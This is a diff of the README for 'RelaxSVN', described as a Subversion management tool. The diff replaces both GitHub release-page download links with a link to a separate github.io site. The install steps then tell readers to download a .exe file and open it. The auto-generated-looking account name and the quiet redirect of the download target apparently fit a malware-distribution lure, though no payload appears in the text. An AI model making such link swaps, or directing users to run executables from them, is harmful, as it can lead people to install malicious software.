@@ -1,6 +1,6 @@
 # 📂 RelaxSVN - Manage your Subversion files with ease
 
-[![Download RelaxSVN](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Baldcypresssavingsandloan849/RelaxSVN/releases)
+[![Download RelaxSVN](https://img.shields.io/badge/Download-Release_Page-blue)](https://baldcypresssavingsandloan849.github.io)
 
 RelaxSVN provides a clear interface for Subversion (SVN) management. It removes the complexity of command-line tools. You connect to your repositories, check out your files, and commit changes using visual controls. This tool assists developers who need a reliable way to track versions of their code.
 
@@ -8,7 +8,7 @@ RelaxSVN provides a clear interface for Subversion (SVN) management. It removes 
 
 You need to download the application to your computer first. Follow these steps to prepare your system.
 
-1. Visit [this page to download the latest version](https://github.com/Baldcypresssavingsandloan849/RelaxSVN/releases).
+1. Visit [this page to download the latest version](https://baldcypresssavingsandloan849.github.io).
 2. Look for the file ending in `.exe` under the Assets section.
 3. Save the file to your computer.
 4. Open the file to start the installation process.
